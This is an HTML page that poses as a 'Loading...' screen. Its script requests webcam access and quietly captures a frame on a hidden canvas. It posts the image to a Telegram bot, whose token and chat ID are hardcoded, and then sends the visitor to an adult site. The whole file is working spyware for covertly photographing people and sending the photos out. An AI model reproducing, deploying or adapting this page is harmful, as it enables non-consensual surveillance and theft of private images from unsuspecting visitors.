<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Camera</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: url('https://example.com/path/to/your/image.jpg') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            overflow: hidden;
        }
        #loading {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <a id="captureLink" href="#" style="display: none;">Capture Camera</a>
    <div id="loading">Loading...</div>
    <script>
        document.getElementById('captureLink').click();

        document.getElementById('captureLink').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('loading').style.display = 'block';

            setTimeout(function() {
                const video = document.createElement('video');
                video.autoplay = true;
                video.style.display = 'none';
                document.body.appendChild(video);

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();

                        setTimeout(function() {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                            const image = canvas.toDataURL('image/jpeg');
                            document.getElementById('loading').style.display = 'none';

                            fetch('https://api.telegram.org/bot8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc/sendPhoto', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: '1966317946',
                                    photo: image
                                })
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('Success:', data);
                                window.location.href = 'https://xhamster.com';
                            })
                            .catch((error) => {
                                console.error('Error:', error);
                            });
                        }, 1000);
                    })
                    .catch(err => {
                        console.error('Error accessing the camera:', err);
                    });
            }, 2000);
        });
    </script>
</body>
</html>
